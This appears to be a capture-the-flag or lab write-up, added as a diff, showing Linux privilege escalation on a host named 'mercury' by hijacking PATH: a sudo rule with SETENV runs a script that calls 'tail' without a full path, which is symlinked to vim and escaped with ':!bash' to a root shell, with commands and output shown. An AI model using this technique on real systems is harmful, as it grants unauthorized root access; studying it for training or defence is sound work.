@@ -1,0 +1,44 @@
+Doing the basic enumeration, I check sudo -l what can be root-run
+
+Funny enough I note something like:
+:~$ sudo -l
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+
+
+See the SETENV. Cat the file to see what it does.
+
+:~$ cat /usr/bin/check_syslog.sh
+#!/bin/bash
+tail -n 10 /var/log/syslog
+
+
+AH HA!  there is no full path on tail, and the first 'tail' that is found in the current user's path will be the 'tail' that gets run. 
+
+Quick search to find something that I can GTFO with...I chose sweet vim. 
+
+:~$ ln -s /usr/bin/vim tail
+
+ls -la tail   -- to confirm it is working 
+lrwxrwxrwx 1 user1 user1 10 Nov 05 12:44 tail -> /usr/bin/vim
+
+Now change the PATH.
+
+:~$ export PATH=$(pwd):$PATH
+:~$ echo $PATH
+/home/user1:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+Use now the --preserve-env to set our environment variable.
+
+:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
+
+This will load vim and we can run :!bash and we have root shell! :boom:
+
+root@mercury:/home/user1# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+
+Congrats.
